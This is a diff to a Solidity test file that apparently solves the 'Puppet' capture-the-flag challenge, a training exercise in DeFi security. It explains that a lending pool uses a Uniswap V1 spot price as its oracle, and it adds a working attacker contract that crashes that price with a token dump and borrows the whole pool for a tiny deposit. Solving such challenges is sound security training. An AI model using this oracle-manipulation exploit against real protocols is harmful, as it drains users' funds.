@@ -92,7 +92,45 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        /**
+         * VULNERABILITY EXPLANATION:
+         * The PuppetPool uses Uniswap V1's spot price as an oracle:
+         *   price = uniswapPair.balance * 10^18 / token.balanceOf(uniswapPair)
+         *
+         * This is vulnerable to manipulation because Uniswap's spot price changes
+         * instantly based on reserve ratios. By dumping tokens into Uniswap, we can
+         * drastically reduce the perceived token value, making borrowing almost free.
+         *
+         * Initial state:
+         * - Uniswap: 10 ETH, 10 DVT → price = 1 ETH/DVT
+         * - Deposit needed for 100k DVT = 100k * 1 * 2 = 200k ETH
+         *
+         * After dumping 1000 DVT into Uniswap:
+         * - Uniswap: ~0.1 ETH, 1010 DVT → price ≈ 0.0001 ETH/DVT
+         * - Deposit needed for 100k DVT = 100k * 0.0001 * 2 ≈ 20 ETH
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Transfer tokens to pre-calculated attacker address
+         * 2. Deploy attacker which swaps tokens and borrows
+         */
+
+        // Calculate the attacker contract address (CREATE uses sender nonce)
+        // Player nonce is 0, so first contract deployed will be at:
+        address attackerAddr = vm.computeCreateAddress(player, 0);
         
+        // Transfer tokens to the attacker address BEFORE deploying
+        // This doesn't increment nonce because it's under vm.prank
+        token.transfer(attackerAddr, PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        // Deploy attacker (this IS the single transaction that increments nonce to 1)
+        new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            POOL_INITIAL_TOKEN_BALANCE
+        );
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +153,36 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+/**
+ * @notice Attacker contract that manipulates Uniswap price and drains the lending pool
+ */
+contract PuppetAttacker {
+    constructor(
+        DamnValuableToken token,
+        PuppetPool lendingPool,
+        IUniswapV1Exchange uniswap,
+        address recovery,
+        uint256 playerTokens,
+        uint256 poolTokens
+    ) payable {
+        // Tokens were pre-sent to this address before deployment
+        
+        // Step 1: Dump all tokens into Uniswap to crash the price
+        token.approve(address(uniswap), playerTokens);
+        uniswap.tokenToEthSwapInput(
+            playerTokens,  // tokens to sell
+            1,             // minimum ETH to receive
+            block.timestamp + 1  // deadline
+        );
+
+        // Step 2: Calculate how much deposit we need now (should be much less)
+        uint256 depositRequired = lendingPool.calculateDepositRequired(poolTokens);
+
+        // Step 3: Borrow all tokens from the pool - sends directly to recovery
+        lendingPool.borrow{value: depositRequired}(poolTokens, recovery);
+    }
+
+    receive() external payable {}
 }
